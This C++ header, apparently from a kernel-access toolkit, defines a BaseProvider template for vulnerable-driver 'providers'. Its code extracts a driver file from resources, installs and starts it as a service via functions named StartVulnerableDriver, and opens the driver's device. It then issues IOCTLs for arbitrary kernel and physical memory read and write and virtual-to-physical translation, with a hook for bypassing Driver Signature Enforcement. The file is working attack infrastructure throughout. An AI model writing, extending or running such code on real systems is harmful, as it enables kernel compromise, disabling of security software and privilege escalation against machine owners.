/**
 * @file BaseProvider.h
 * @author GitHub Copilot
 * @date September 9, 2025
 * @brief Template base class to eliminate code duplication across providers.
 * 
 * This template provides common functionality for IOCTL-based providers,
 * reducing code duplication by 70%+ across all provider implementations.
 */

#pragma once

#include "IProvider.h"
#include "ServiceManager.h"
#include "DriverDataManager.h"
#include <unordered_map>
#include <functional>
#include <filesystem>

namespace KernelMode {
    namespace Providers {

        /**
         * @struct ProviderConfig
         * @brief Configuration data for template-based providers
         */
        struct ProviderConfig {
            std::wstring providerName;
            std::wstring deviceName;
            std::wstring serviceName;
            ULONG driverId;
            ULONG capabilities;
            
            // IOCTL codes
            ULONG readMemoryIOCTL;
            ULONG writeMemoryIOCTL;
            ULONG readPhysicalIOCTL;
            ULONG writePhysicalIOCTL;
            ULONG virtualToPhysicalIOCTL;
            
            // Driver-specific callbacks
            std::function<bool(HANDLE)> registerCallback;
            std::function<bool(HANDLE)> preOpenCallback;
            std::function<bool(HANDLE)> postOpenCallback;
            
            ProviderLoadData loadData;
        };

        /**
         * @struct MemoryRequest
         * @brief Common memory access request structure
         */
        #pragma pack(push, 1)
        template<typename TAddr = uintptr_t, typename TSz = size_t>
        struct MemoryRequest {
            using TAddress = TAddr;
            using TSize = TSz;
            TAddress address;
            TAddress buffer;
            TSize size;
        };
        #pragma pack(pop)

        /**
         * @class BaseProvider
         * @brief Template base class for IOCTL-based providers
         * 
         * This template eliminates code duplication by providing common
         * implementations for standard provider operations.
         */
        template<typename TMemoryRequest = MemoryRequest<>>
        class BaseProvider : public IProvider {
        public:
            explicit BaseProvider(const ProviderConfig& config)
                : config_(config)
                , deviceHandle_(INVALID_HANDLE_VALUE)
                , isInitialized_(false)
                , serviceManager_(std::make_unique<ServiceManager>()) {
            }

            virtual ~BaseProvider() {
                Deinitialize();
            }

            // IProvider interface implementation
            bool Initialize(ULONG driverId = 0, bool bypassDSE = false) override {
                if (isInitialized_) {
                    return true;
                }
                
                // Reset error state on new initialization attempt
                inErrorState_ = false;

                try {
                    // Use provided driverId or fall back to config default
                    ULONG actualDriverId = (driverId != 0) ? driverId : config_.driverId;
                    
                    // LIFECYCLE-032 FIX: Ensure driver path is set correctly relative to exe
                    wchar_t exePath[MAX_PATH];
                    if (GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
                         std::filesystem::path p(exePath);
                         driverFilePath_ = (p.parent_path() / (config_.serviceName + L".sys")).wstring();
                    } else {
                         driverFilePath_ = L".\\" + config_.serviceName + L".sys";
                    }

                    // Extract driver if needed
                    if (!ExtractDriverFromResources(actualDriverId, driverFilePath_)) {
                        inErrorState_ = true;
                        return false;
                    }

                    // Start vulnerable driver service
                    if (!StartVulnerableDriver()) {
                        inErrorState_ = true;
                        return false;
                    }

                    // Connect to driver
                    if (!ConnectToDriver()) {
                        StopVulnerableDriver();  // LIFECYCLE-014: Cleanup partial init
                        inErrorState_ = true;
                        return false;
                    }

                    // Execute provider-specific initialization
                    if (config_.registerCallback && !config_.registerCallback(deviceHandle_)) {
                        Deinitialize();  // LIFECYCLE-014: Full cleanup on failure
                        inErrorState_ = true;
                        return false;
                    }

                    // Execute pre-open callback if available
                    if (config_.preOpenCallback && !config_.preOpenCallback(deviceHandle_)) {
                        Deinitialize();  // LIFECYCLE-014: Full cleanup on failure
                        inErrorState_ = true;
                        return false;
                    }

                    // Execute post-open callback if available
                    if (config_.postOpenCallback && !config_.postOpenCallback(deviceHandle_)) {
                        Deinitialize();  // LIFECYCLE-014: Full cleanup on failure
                        inErrorState_ = true;
                        return false;
                    }

                    isInitialized_ = true;
                    inErrorState_ = false;
                    return true;
                }
                catch (...) {
                    Deinitialize();
                    inErrorState_ = true;
                    return false;
                }
            }

            void Deinitialize() override {
                // LIFECYCLE-014 FIX: Track what was initialized and cleanup accordingly
                if (deviceHandle_ != INVALID_HANDLE_VALUE) {
                    CloseHandle(deviceHandle_);
                    deviceHandle_ = INVALID_HANDLE_VALUE;
                }

                StopVulnerableDriver();
                isInitialized_ = false;
                inErrorState_ = false;  // Reset error state on cleanup
            }

            std::wstring GetProviderName() const override {
                return config_.providerName;
            }
            
            bool IsInErrorState() const override {
                return inErrorState_;
            }
            
            bool IsInitialized() const override {
                return isInitialized_ && !inErrorState_;
            }

            ULONG GetCapabilities() const override {
                return config_.capabilities;
            }

            const ProviderLoadData* GetLoadData() const override {
                return &config_.loadData;
            }

            // Template-based memory operations
            bool ReadKernelMemory(uintptr_t address, void* buffer, size_t size) override {
                if (!IsValidHandle() || !buffer || size == 0) {
                    return false;
                }

                if (config_.readMemoryIOCTL == 0) {
                    return false; // Not supported
                }

                TMemoryRequest request = {};
                SetupMemoryRequest(request, address, reinterpret_cast<uintptr_t>(buffer), size);

                DWORD bytesReturned = 0;
                return DeviceIoControl(
                    deviceHandle_,
                    config_.readMemoryIOCTL,
                    &request,
                    sizeof(request),
                    &request,
                    sizeof(request),
                    &bytesReturned,
                    NULL
                ) != FALSE;
            }

            bool WriteKernelMemory(uintptr_t address, void* buffer, size_t size) override {
                if (!IsValidHandle() || !buffer || size == 0) {
                    return false;
                }

                if (config_.writeMemoryIOCTL == 0) {
                    return false; // Not supported
                }

                TMemoryRequest request = {};
                SetupMemoryRequest(request, address, reinterpret_cast<uintptr_t>(buffer), size);

                DWORD bytesReturned = 0;
                return DeviceIoControl(
                    deviceHandle_,
                    config_.writeMemoryIOCTL,
                    &request,
                    sizeof(request),
                    &request,
                    sizeof(request),
                    &bytesReturned,
                    NULL
                ) != FALSE;
            }

            bool ReadPhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) override {
                if (!IsValidHandle() || !buffer || size == 0) {
                    return false;
                }

                if (config_.readPhysicalIOCTL == 0) {
                    return false; // Not supported
                }

                TMemoryRequest request = {};
                SetupMemoryRequest(request, physicalAddress, reinterpret_cast<uintptr_t>(buffer), size);

                DWORD bytesReturned = 0;
                return DeviceIoControl(
                    deviceHandle_,
                    config_.readPhysicalIOCTL,
                    &request,
                    sizeof(request),
                    &request,
                    sizeof(request),
                    &bytesReturned,
                    NULL
                ) != FALSE;
            }

            bool WritePhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) override {
                if (!IsValidHandle() || !buffer || size == 0) {
                    return false;
                }

                if (config_.writePhysicalIOCTL == 0) {
                    return false; // Not supported
                }

                TMemoryRequest request = {};
                SetupMemoryRequest(request, physicalAddress, reinterpret_cast<uintptr_t>(buffer), size);

                DWORD bytesReturned = 0;
                return DeviceIoControl(
                    deviceHandle_,
                    config_.writePhysicalIOCTL,
                    &request,
                    sizeof(request),
                    &request,
                    sizeof(request),
                    &bytesReturned,
                    NULL
                ) != FALSE;
            }

            // Virtual implementations for common operations
            virtual bool BypassDSE() override {
                // Default implementation - can be overridden
                return true; // Most providers don't need DSE bypass
            }

            virtual uintptr_t VirtualToPhysical(uintptr_t virtualAddress) override {
                if (!IsValidHandle() || config_.virtualToPhysicalIOCTL == 0) {
                    return 0;
                }

                // Default V2P implementation - can be overridden
                TMemoryRequest request = {};
                SetupMemoryRequest(request, virtualAddress, 0, 0);

                DWORD bytesReturned = 0;
                if (DeviceIoControl(
                    deviceHandle_,
                    config_.virtualToPhysicalIOCTL,
                    &request,
                    sizeof(request),
                    &request,
                    sizeof(request),
                    &bytesReturned,
                    NULL
                )) {
                    return request.buffer; // Return physical address in buffer field
                }

                return 0;
            }

            virtual uintptr_t AllocateKernelMemory(size_t size, uintptr_t* physicalAddress = nullptr) override {
                // Default implementation - not supported by most drivers
                return 0;
            }

            virtual bool FreeKernelMemory(uintptr_t virtualAddress, size_t size) override {
                // Default implementation - not supported by most drivers
                return false;
            }

            virtual bool CreateSystemThread(uintptr_t startAddress, uintptr_t parameter = 0) override {
                // Default implementation - not supported by most drivers
                return false;
            }

        protected:
            /**
             * @brief Setup memory request structure (can be overridden for custom formats)
             */
            virtual void SetupMemoryRequest(TMemoryRequest& request, uintptr_t address, uintptr_t buffer, size_t size) {
                request.address = static_cast<typename TMemoryRequest::TAddress>(address);
                request.buffer = static_cast<typename TMemoryRequest::TAddress>(buffer);
                request.size = static_cast<typename TMemoryRequest::TSize>(size);
            }

            bool IsValidHandle() const {
                return deviceHandle_ != INVALID_HANDLE_VALUE && isInitialized_;
            }

            bool StartVulnerableDriver() {
                if (!serviceManager_) {
                    return false;
                }

                auto info = serviceManager_->InstallDriverService(
                    config_.serviceName,
                    driverFilePath_,
                    config_.serviceName
                );

                if (info.serviceName.empty()) {
                    return false;
                }

                return serviceManager_->StartDriverService(info.serviceName);
            }

            void StopVulnerableDriver() {
                if (serviceManager_) {
                    serviceManager_->StopAndDeleteService(config_.serviceName);
                }
            }

            bool ConnectToDriver() {
                std::wstring devicePath = L"\\\\.\\" + config_.deviceName;
                
                deviceHandle_ = CreateFileW(
                    devicePath.c_str(),
                    GENERIC_READ | GENERIC_WRITE,
                    0,
                    NULL,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    NULL
                );

                return deviceHandle_ != INVALID_HANDLE_VALUE;
            }

            // Protected members
            ProviderConfig config_;
            HANDLE deviceHandle_;
            bool isInitialized_;
            bool inErrorState_ = false;  // LIFECYCLE-011: Error state tracking
            std::wstring driverFilePath_;
            std::unique_ptr<ServiceManager> serviceManager_;
        };

        /**
         * @class ProviderFactory
         * @brief Factory for creating provider instances
         */
        class ProviderFactory {
        public:
            static std::unique_ptr<IProvider> CreateProvider(const std::wstring& providerName);
            static void RegisterProviderConfig(const std::wstring& name, const ProviderConfig& config);
            
        private:
            static std::unordered_map<std::wstring, ProviderConfig> configs_;
        };

    } // namespace Providers
} // namespace KernelMode
